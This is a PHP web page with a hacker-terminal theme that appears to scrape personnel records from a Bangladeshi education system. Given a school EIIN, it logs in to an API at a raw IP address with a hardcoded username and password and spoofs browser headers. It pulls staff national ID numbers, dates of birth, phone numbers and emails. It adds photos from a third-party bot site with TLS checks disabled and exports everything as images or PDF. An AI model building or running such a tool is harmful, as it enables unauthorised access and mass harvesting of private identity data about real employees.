<?php
/**
 * iOS Ultra-Transparent AJAX Personnel Portal - ADVANCED HACKER LOADER
 * Design: Decrypt Animation + Permanent Blinking + iOS Glass
 * Features Added: Live Search Filter, Image/PDF Export, Analytics Panel
 * Credit: DIPTO | Telegram: https://t.me/Xrror_404
 */

if (isset($_GET['action']) && $_GET['action'] == 'fetch_data') {
    header('Content-Type: application/json; charset=utf-8');
    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
    header("Pragma: no-cache");

    $eiinNo = $_GET['eiinNo'] ?? null;
    $page = $_GET['page'] ?? 1;
    $size = $_GET['size'] ?? 200; 

    if (!$eiinNo) {
        echo json_encode(['status' => 'error', 'msg' => 'দয়া করে eiinNo দিন!']);
        exit;
    }

    function getRandomUserAgent() {
        $chromes = [148, 149, 150, 151, 152];
        $randChrome = $chromes[array_rand($chromes)];
        $randBuild = rand(100, 999);
        return "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$randChrome.0.7827.$randBuild Mobile Safari/537.36";
    }
    $currentUA = getRandomUserAgent();

    function makeStrictRequest($url, $method = 'GET', $payload = null, $headers = []) {
        $ch = curl_init($url);
        $options = [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 12,
            CURLOPT_CONNECTTIMEOUT => 6,
            CURLOPT_HTTPHEADER     => $headers,
            CURLOPT_FRESH_CONNECT  => true,  
            CURLOPT_FORBID_REUSE   => true,  
            CURLOPT_TCP_NODELAY    => true   
        ];
        if ($method === 'POST') {
            $options[CURLOPT_POST] = true;
            $options[CURLOPT_POSTFIELDS] = $payload;
        }
        curl_setopt_array($ch, $options);
        $res = curl_exec($ch);
        curl_close($ch);
        return $res;
    }

    function getInstituteData($eiin, $ua) {
        $url = "http://182.252.85.81:8000/api/v1/institute/public/find-by-eiin/" . $eiin . "?nocache=" . microtime(true);
        $headers = ["Content-Type: application/json", "User-Agent: $ua"];
        $res = makeStrictRequest($url, 'GET', null, $headers);
        $data = json_decode($res, true);
        $targetData = $data['data'] ?? $data;
        if (!empty($targetData)) {
            return [
                'id' => $targetData['id'] ?? null,
                'instituteName' => $targetData['instituteName'] ?? $targetData['name'] ?? 'নাম পাওয়া যায়নি',
                'instituteNameBn' => $targetData['instituteNameBn'] ?? $targetData['nameInBangla'] ?? $targetData['nameBn'] ?? 'বাংলা নাম পাওয়া যায়নি',
                'email' => $targetData['email'] ?? $targetData['instituteEmail'] ?? 'ইমেইল পাওয়া যায়নি',
                'mobile' => $targetData['mobile'] ?? $targetData['mobileNo'] ?? $targetData['phone'] ?? 'মোবাইল নম্বর পাওয়া যায়নি',
                'instituteTypeNameBn' => $targetData['instituteTypeNameBn'] ?? $targetData['instituteTypeBn'] ?? $targetData['typeNameBn'] ?? 'ইনস্টিটিউট টাইপ পাওয়া যায়নি',
                'managementNameBn' => $targetData['managementNameBn'] ?? $targetData['managementTypeBn'] ?? $targetData['managementBn'] ?? 'ম্যানেজমেন্ট তথ্য পাওয়া যায়নি',
                'villageOrHoldingNo' => $targetData['villageOrHoldingNo'] ?? $targetData['village'] ?? $targetData['holdingNo'] ?? $targetData['address'] ?? 'গ্রাম/হোল্ডিং নম্বর পাওয়া যায়নি'
            ];
        }
        return null;
    }

    function getEsurveyData($eiin, $ua) {
        $url = "http://182.252.85.81:8082/api/v1/basic-info-one/info?eiinNo=" . $eiin . "&nocache=" . microtime(true);
        $headers = ["Content-Type: application/json", "User-Agent: $ua"];
        $res = makeStrictRequest($url, 'GET', null, $headers);
        $data = json_decode($res, true);
        $targetData = $data['data'] ?? $data;
        if (!empty($targetData)) {
            $poName = $targetData['generalInfo']['postOfficeName'] ?? $targetData['postOfficeName'] ?? 'পোস্ট অফিস পাওয়া যায়নি';
            return [
                'esurveyId' => $targetData['esurveyId'] ?? null,
                'postOfficeName' => trim($poName)
            ];
        }
        return null;
    }

    function getAccessToken($ua) {
        $antiCacheKey = microtime(true) . "_" . rand(10000, 99999);
        $url = "http://182.252.85.81:8028/api/v1/auth/login?force_refresh=" . $antiCacheKey;
        $payload = json_encode(['username' => '124168', 'password' => '532688']);
        $headers = [
            "Host: 182.252.85.81:8028", "Connection: close", "Content-Type: application/json",
            "User-Agent: $ua", "Accept: */*", "Origin: http://182.252.85.84:3028",
            "X-Requested-With: mark.via.gp", "Referer: http://182.252.85.84:3028/", "Accept-Language: en-US,en;q=0.9"
        ];
        $res = makeStrictRequest($url, 'POST', $payload, $headers);
        $data = json_decode($res, true);
        return $data['accessToken'] ?? $data['token'] ?? $data['data']['token'] ?? $data['data']['accessToken'] ?? null;
    }

    function cleanTeacherName($name) {
        $name = str_replace('.', '', $name); 
        $name = preg_replace('/\s+/', '', $name); 
        return strtolower(trim($name)); 
    }

    function getFieldValue($text, $key) {
        if (preg_match('/' . preg_quote($key, '/') . '\s*:\s*([^\r\n]*)/i', $text, $matches)) {
            return trim($matches[1]);
        }
        return null;
    }

    // আপনার নতুন API রিকোয়েস্ট ও হেডার লজিক এখানে যুক্ত করা হলো
    function fetchImagesFromSecondApi($eiinNo) {
        $eiin = urlencode(trim($eiinNo));
        $apiUrl = "https://w8team.top/Bots/EIIN%20To%20Info%20bot/EIIN%20To%20Info.php?EIINToInfo=" . $eiin;
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, ''); 
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.7871.46 Mobile Safari/537.36');

        $headers = [
            'Host: w8team.top',
            'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"',
            'sec-ch-ua-mobile: ?1',
            'sec-ch-ua-platform: "Android"',
            'upgrade-insecure-requests: 1',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt: 1',
            'x-requested-with: mark.via.gp',
            'sec-fetch-site: none',
            'sec-fetch-mode: navigate',
            'sec-fetch-user: ?1',
            'sec-fetch-dest: document',
            'accept-language: en-US,en;q=0.9',
            'cookie: wssplashchk=070ee2c8d3950220845bad3080a84b1a5d69ef60.1784578780.1',
            'priority: u=0, i'
        ];
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $res = curl_exec($ch);
        curl_close($ch);

        $imageMap = [];
        if ($res !== false) {
            $outerJson = json_decode($res, true);
            $rawText = is_array($outerJson) && isset($outerJson['data']) ? $outerJson['data'] : $res;
            
            // নতুন API-র ফিল্ড ফরম্যাট অনুযায়ী split করা (Case-Insensitive)
            $teacherBlocks = preg_split('/\[Teacher\s+#\d+\]/i', $rawText);
            array_shift($teacherBlocks); 

            foreach ($teacherBlocks as $block) {
                // নতুন API-তে 'FullName' অথবা 'TeacherName' এবং 'Image' ফিল্ড চেক করা
                $teacherName = getFieldValue($block, 'FullName') ?? getFieldValue($block, 'TeacherName') ?? getFieldValue($block, 'Name');
                $image = getFieldValue($block, 'Image');
                
                if (!empty($teacherName) && !empty($image) && $image !== '-' && $image !== 'NULL') {
                    $cleanName = cleanTeacherName($teacherName);
                    $imageMap[$cleanName] = trim($image);
                }
            }
        }
        return $imageMap;
    }

    $instData = getInstituteData($eiinNo, $currentUA);
    $esurveyData = getEsurveyData($eiinNo, $currentUA);

    $instId = $instData['id'] ?? null;
    $esurveyId = $esurveyData['esurveyId'] ?? null;
    $finalInstId = $instId ?? $esurveyId;

    if (!$finalInstId || !$esurveyId) {
        echo json_encode(['status' => 'error', 'msg' => 'প্রয়োজনীয় ID বা EIIN পাওয়া যায়নি।']);
        exit;
    }

    $token = getAccessToken($currentUA);
    if (!$token) {
        echo json_encode(['status' => 'error', 'msg' => 'Bearer Token জেনারেট করা সম্ভব হয়নি।']);
        exit;
    }

    $apiUrl = "http://182.252.85.81:8028/api/v1/employee/list?page=$page&size=$size&eSurveyId=$esurveyId&instituteId=$finalInstId&request_id=" . rand(1111, 9999);
    $employeeHeaders = [
        "Host: 182.252.85.81:8028", "Authorization: Bearer " . $token, "Connection: close",
        "Content-Type: application/json", "User-Agent: $currentUA", "Accept: */*",
        "Origin: http://182.252.85.84:3028", "Referer: http://182.252.85.84:3028/"
    ];

    $finalRes = makeStrictRequest($apiUrl, 'GET', null, $employeeHeaders);
    $finalData = json_decode($finalRes, true);
    $outputData = $finalData['data'] ?? $finalData ?? [];

    $apiImages = fetchImagesFromSecondApi($eiinNo);

    if (is_array($outputData)) {
        foreach ($outputData as &$emp) {
            $name = $emp['generalInformation']['employeeName'] ?? '';
            $cleanEmpName = cleanTeacherName($name);
            
            if (!empty($cleanEmpName) && isset($apiImages[$cleanEmpName])) {
                $emp['generalInformation']['image'] = $apiImages[$cleanEmpName];
            } else {
                $emp['generalInformation']['image'] = null;
            }
        }
    }

    echo json_encode([
        'status' => 'success',
        'info' => $instData,
        'instName' => $instData['instituteName'],
        'data' => ['data' => $outputData]
    ], JSON_UNESCAPED_UNICODE);
    exit;
}
?>

<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ROOT@Xrror-404_TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>

    <style>
        body { background: #000; color: #00ff41; font-family: 'Fira Code', monospace; margin: 0; overflow-x: hidden; }
        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.4; }
        
        #hacker-loader {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.98); z-index: 10000; display: none;
            flex-direction: column; align-items: center; justify-content: center;
        }
        .loader-box { width: 300px; text-align: left; }
        .progress-bar-bg { width: 100%; height: 4px; background: rgba(0,255,65,0.1); margin: 15px 0; border-radius: 10px; overflow: hidden; }
        #progress-fill { width: 0%; height: 100%; background: #00ff41; box-shadow: 0 0 10px #00ff41; }
        #log-stream { height: 120px; overflow: hidden; font-size: 10px; color: #008f11; margin-top: 10px; line-height: 1.4; }

        .ios-glass {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 255, 65, 0.15); border-radius: 15px;
        }
        .hacker-blink { animation: blink 2.5s infinite ease-in-out; }
        @keyframes blink {
            0%, 100% { opacity: 1; filter: drop-shadow(0 0 2px #00ff41); }
            50% { opacity: 0.5; filter: drop-shadow(0 0 8px #00ff41); }
        }
        .glitch-text { text-shadow: 0 0 10px #00ff41; animation: glitch-glow 1s infinite alternate; }
        @keyframes glitch-glow {
            0% { text-shadow: 0 0 5px #00ff41, 2px 0 #f00; }
            100% { text-shadow: 0 0 15px #00ff41, -2px 0 #00f; }
        }
        .status-pulse {
            width: 10px; height: 10px; background: #00ff41; border-radius: 50%;
            box-shadow: 0 0 15px #00ff41; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.5; } }

        .label { font-size: 10px; color: rgba(0, 255, 65, 0.5); text-transform: uppercase; margin-top: 8px; font-weight: bold; }
        .data-field { font-size: 14px; color: #fff; min-height: 20px; }
        .btn-scan { background: #00ff41; color: #000; font-weight: bold; border-radius: 4px; transition: 0.3s; }
        .btn-scan:hover { box-shadow: 0 0 25px #00ff41; transform: scale(1.05); }
        .footer-link { color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 5px 15px; border-radius: 4px; font-size: 11px; transition: 0.3s; }
        .footer-link:hover { background: #00ff41; color: #000; }
        
        .btn-action { border: 1px solid rgba(0,255,65,0.4); color: #00ff41; background: transparent; transition: 0.2s; }
        .btn-action:hover { background: rgba(0,255,65,0.1); box-shadow: 0 0 10px rgba(0,255,65,0.2); }

        @media print {
            body { background: white !important; color: black !important; }
            #matrix-canvas, header, footer, .btn-action, #searchTerm, .hacker-loader { display: none !important; }
            .ios-glass { border: 1px solid #ccc !important; background: transparent !important; color: black !important; backdrop-filter: none !important; box-shadow: none !important; }
            .data-field { color: black !important; }
            .label { color: #555 !important; }
            #cards-container { grid-template-columns: 1fr !important; gap: 15px !important; }
        }
    </style>
</head>
<body>

    <div id="hacker-loader">
        <div class="loader-box">
            <div class="flex items-center justify-between mb-2">
                <div class="text-xs tracking-[5px] animate-pulse">SYSTEM_DECRYPTING</div>
                <div id="load-pct" class="text-xs">0%</div>
            </div>
            <div class="progress-bar-bg"><div id="progress-fill"></div></div>
            <div id="log-stream"></div>
            <div class="mt-4 text-[8px] opacity-40 font-mono tracking-tighter" id="binary-glitch">010101010101010101010101</div>
        </div>
    </div>

    <canvas id="matrix-canvas"></canvas>

    <header class="ios-glass m-4 p-4 sticky top-4 z-50">
        <div class="container mx-auto flex flex-col sm:flex-row justify-between items-center gap-4">
            <div class="flex items-center gap-3">
                <div class="status-pulse"></div>
                <h1 class="text-xs font-bold uppercase tracking-[4px] text-white">XRROR_404 V6</h1>
            </div>
            <div class="flex w-full sm:w-auto gap-2">
                <input type="number" id="eiinInput" placeholder="Enter EIIN Number" 
                       class="bg-black/40 text-green-400 border border-green-900/50 rounded px-4 py-2 outline-none w-full text-sm">
                <button onclick="fetchData()" class="btn-scan px-6 py-2 uppercase">Scan</button>
            </div>
        </div>
    </header>

    <main class="container mx-auto px-4 py-6" id="content-area">
        <div class="h-80 flex flex-col items-center justify-center opacity-10">
            <p class="tracking-[10px] text-xs">PORT_READY_FOR_INJECTION</p>
        </div>
    </main>

    <footer class="container mx-auto px-4 py-12 text-center border-t border-green-900/20">
        <div class="flex flex-col items-center gap-5">
            <span class="text-sm font-bold text-white tracking-widest opacity-70">ADMIN: DIPTO</span>
            <a href="https://t.me/Xrror_404" target="_blank" class="footer-link uppercase font-bold tracking-widest">Join Telegram</a>
        </div>
    </footer>

    <script>
        let cachedEmployees = [];
        let loaderInterval = null; 

        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const chars = "010101DIPTO";
        const fontSize = 15;
        const columns = canvas.width / fontSize;
        const drops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.08)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        function startLoader() {
            const logs = [
                "REQUESTING_STRICT_TOKEN...", 
                "ACCESS_GRANTED!", 
                "INJECTING_PAYLOAD...", 
                "FETCHING_INST_DATA...", 
                "MATCHING_NAMES_AND_IMAGES...", 
                "DECRYPTING_SECURE_NODE..."
            ];
            const logBox = document.getElementById('log-stream');
            const fill = document.getElementById('progress-fill');
            const pct = document.getElementById('load-pct');
            const binary = document.getElementById('binary-glitch');
            
            let p = 0;
            logBox.innerHTML = '';
            
            if(loaderInterval) clearInterval(loaderInterval);

            loaderInterval = setInterval(() => {
                if (p < 92) {
                    p += Math.floor(Math.random() * 3) + 1;
                    if(p > 92) p = 92;
                    fill.style.width = p + '%';
                    pct.innerText = p + '%';
                }
                
                const line = document.createElement('div');
                line.innerText = '> ' + logs[Math.floor(Math.random() * logs.length)];
                logBox.prepend(line);

                if(logBox.children.length > 8) {
                    logBox.removeChild(logBox.lastChild);
                }

                binary.innerText = Math.random().toString(2).substr(2, 40);
            }, 80); 
        }

        function endLoader() {
            clearInterval(loaderInterval);
            const fill = document.getElementById('progress-fill');
            const pct = document.getElementById('load-pct');
            
            fill.style.width = '100%';
            pct.innerText = '100%';
            
            setTimeout(() => { 
                document.getElementById('hacker-loader').style.display = 'none'; 
            }, 500);
        }

        function animateData(element, finalValue, duration = 25) {
            if(!element) return;
            const scrambleChars = "!@#$%^&*()_+0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            let iteration = 0;
            const interval = setInterval(() => {
                element.innerText = finalValue.split("")
                    .map((char, index) => {
                        if (index < iteration) return finalValue[index];
                        return scrambleChars[Math.floor(Math.random() * scrambleChars.length)];
                    }).join("");
                
                if (iteration >= finalValue.length) {
                    clearInterval(interval);
                    element.classList.add('hacker-blink');
                }
                iteration += 1 / 3;
            }, duration);
        }

        async function fetchData() {
            const eiin = document.getElementById('eiinInput').value;
            if(!eiin) return;

            const loader = document.getElementById('hacker-loader');
            const contentArea = document.getElementById('content-area');

            loader.style.display = 'flex';
            startLoader();
            
            try {
                const response = await fetch(`?action=fetch_data&eiinNo=${eiin}`);
                const res = await response.json();

                if (res.status === 'success') {
                    cachedEmployees = res.data.data || [];
                    const totalEmployees = cachedEmployees.length.toString().padStart(2, '0');
                    const info = res.info || {};
                    const uniqueDesignations = new Set(cachedEmployees.map(e => e.recruitmentInformation?.designationName).filter(Boolean)).size;

                    contentArea.innerHTML = `
                        <div id="printable-area">
                            <div class="ios-glass p-6 mb-6 border-l-4 border-l-green-500 grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                    <h2 id="inst-title" class="text-xl font-bold text-white uppercase tracking-wider"></h2>
                                    <p class="text-xs text-gray-400 mt-1">${info.instituteNameBn || ''}</p>
                                    <div class="mt-4 text-sm text-green-400 font-bold tracking-widest">
                                        TOTAL_EMPLOYEES: [<span id="total-count" class="glitch-text text-white">--</span>]
                                    </div>
                                </div>
                                <div class="text-xs space-y-1 text-gray-300 border-t md:border-t-0 md:border-l border-green-900/30 pt-3 md:pt-0 md:pl-4 font-mono">
                                    <div><span class="text-green-500">TYPE:</span> ${info.instituteTypeNameBn || 'N/A'}</div>
                                    <div><span class="text-green-500">MGMT:</span> ${info.managementNameBn || 'N/A'}</div>
                                    <div><span class="text-green-500">MOB:</span> ${info.mobile || 'N/A'}</div>
                                    <div><span class="text-green-500">MAIL:</span> ${info.email || 'N/A'}</div>
                                    <div><span class="text-green-500">ADDR:</span> ${info.villageOrHoldingNo || 'N/A'}</div>
                                </div>
                            </div>

                            <div id="action-bar" class="ios-glass p-4 mb-6 flex flex-col md:flex-row justify-between items-center gap-4 font-mono text-xs">
                                <div class="w-full md:w-72 flex items-center bg-black/50 border border-green-900/40 rounded px-3 py-1.5">
                                    <span class="text-green-600 mr-2">🔎</span>
                                    <input type="text" id="searchTerm" oninput="filterCards()" placeholder="Search Name, Post..." 
                                           class="bg-transparent text-green-400 placeholder-green-800 outline-none w-full text-xs">
                                </div>
                                <div class="flex flex-wrap items-center gap-2">
                                    <div class="text-gray-400 mr-2">UNIQUE_POSTS: <span class="text-orange-400 font-bold">${uniqueDesignations}</span></div>
                                    <button onclick="exportToImage()" class="btn-action px-3 py-1.5 rounded uppercase font-bold text-[10px] tracking-wider">
                                        🖼️ Save Image
                                    </button>
                                    <button onclick="window.print()" class="btn-action px-3 py-1.5 rounded uppercase font-bold text-[10px] tracking-wider">
                                        📄 Print / PDF
                                    </button>
                                </div>
                            </div>

                            <div id="cards-container" class="grid grid-cols-1 md:grid-cols-2 gap-6"></div>
                        </div>`;

                    animateData(document.getElementById('inst-title'), res.instName);
                    setTimeout(() => animateData(document.getElementById('total-count'), totalEmployees, 60), 400);

                    renderCards(cachedEmployees);

                } else { alert("Error: " + res.msg); }
            } catch (e) { alert("Connection Error"); }
            finally { 
                endLoader(); 
            }
        }

        function renderCards(list) {
            const container = document.getElementById('cards-container');
            container.innerHTML = '';
            
            if(list.length === 0) {
                container.innerHTML = `<div class="col-span-full text-center text-sm opacity-50 py-12">NO MATCHING DATA FOUND</div>`;
                return;
            }

            list.forEach((emp, i) => {
                const genInfo = emp.generalInformation || {};
                const recInfo = emp.recruitmentInformation || {};
                
                let imageTag = '';
                if(genInfo.image && genInfo.image !== null && genInfo.image !== '' && genInfo.image !== 'NULL') {
                    imageTag = `<div class="mb-3 flex justify-start">
                                    <img src="${genInfo.image}" alt="Profile" class="w-20 h-24 object-cover rounded-md border border-green-500/30 shadow-md">
                                </div>`;
                }

                const cardHtml = `
                    <div class="ios-glass p-6 transition-all duration-300 hover:border-green-400/40">
                        ${imageTag}
                        <div class="border-b border-white/10 pb-3 mb-4">
                            <h3 class="text-white font-bold text-md">${genInfo.employeeName || 'N/A'}</h3>
                            <div class="text-[10px] text-green-400 font-bold uppercase">${recInfo.designationName || 'N/A'}</div>
                            <div class="text-orange-400 text-[10px] font-bold mt-1">Subject: ${recInfo.subjectName || "N/A"}</div>
                        </div>
                        <div class="label">NID</div><div class="data-field font-mono text-xs">${genInfo.nid || "N/A"}</div>
                        <div class="label">Date of Birth</div><div class="data-field text-sm">${genInfo.dateOfBirth || "N/A"}</div>
                        <div class="label">Mobile</div><div class="data-field text-green-400 font-bold text-sm">${genInfo.mobileNumber || 'N/A'}</div>
                        <div class="label">Email</div><div class="data-field text-gray-400 italic text-xs truncate">${genInfo.email || "N/A"}</div>
                    </div>`;
                container.insertAdjacentHTML('beforeend', cardHtml);
            });
        }

        function filterCards() {
            const term = document.getElementById('searchTerm').value.toLowerCase().trim();
            if(!term) {
                renderCards(cachedEmployees);
                return;
            }
            
            const filtered = cachedEmployees.filter(emp => {
                const name = (emp.generalInformation?.employeeName || '').toLowerCase();
                const mobile = (emp.generalInformation?.mobileNumber || '').toLowerCase();
                const desig = (emp.recruitmentInformation?.designationName || '').toLowerCase();
                const subject = (emp.recruitmentInformation?.subjectName || '').toLowerCase();
                
                return name.includes(term) || mobile.includes(term) || desig.includes(term) || subject.includes(term);
            });
            
            renderCards(filtered);
        }

        function exportToImage() {
            const element = document.getElementById('printable-area');
            const actionBar = document.getElementById('action-bar');
            
            actionBar.style.display = 'none';

            html2canvas(element, {
                backgroundColor: '#000000',
                scale: 2, 
                logging: false,
                useCORS: true
            }).then(canvas => {
                actionBar.style.display = 'flex'; 
                
                const image = canvas.toDataURL("image/png");
                const link = document.createElement('a');
                const eiinVal = document.getElementById('eiinInput').value || 'Data';
                
                link.download = `Personnel_Portal_${eiinVal}.png`;
                link.href = image;
                link.click();
            }).catch(err => {
                actionBar.style.display = 'flex';
                alert("Image conversion failed.");
            });
        }
    </script>
</body>
</html>
